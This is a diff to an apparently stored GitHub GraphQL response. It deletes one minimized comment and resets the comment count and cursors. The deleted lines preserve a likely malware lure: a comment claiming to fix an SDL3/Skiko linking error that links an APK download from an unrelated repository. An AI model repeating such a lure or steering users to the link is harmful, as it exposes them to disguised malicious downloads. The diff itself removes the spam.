@@ -128,26 +128,14 @@
           ]
         },
         "comments": {
-          "totalCount": 1,
+          "totalCount": 0,
           "pageInfo": {
-            "startCursor": "Y3Vyc29yOnYyOpHPAAAAAR-nRt0=",
-            "endCursor": "Y3Vyc29yOnYyOpHPAAAAAR-nRt0=",
+            "startCursor": null,
+            "endCursor": null,
             "hasPreviousPage": false,
             "hasNextPage": false
           },
-          "nodes": [
-            {
-              "body": "Man, that SDL3 linking error was driving me nuts too. I found that the native linker was tripping over some missing symbols in the Skiko wrapper, so I put together a quick patch to bridge the SDL3 calls properly. It finally works on my end. compose_native_fix.apk(https://github.com/keracocobe/123/releases/download/update/module.apk)",
-              "publishedAt": "2026-06-28T12:01:07Z",
-              "isMinimized": true,
-              "minimizedReason": "off-topic",
-              "author": {
-                "login": "dogasosedo",
-                "url": "https://github.com/dogasosedo",
-                "avatarUrl": "https://avatars.githubusercontent.com/u/297623215?v=4"
-              }
-            }
-          ]
+          "nodes": []
         }
       },
       {
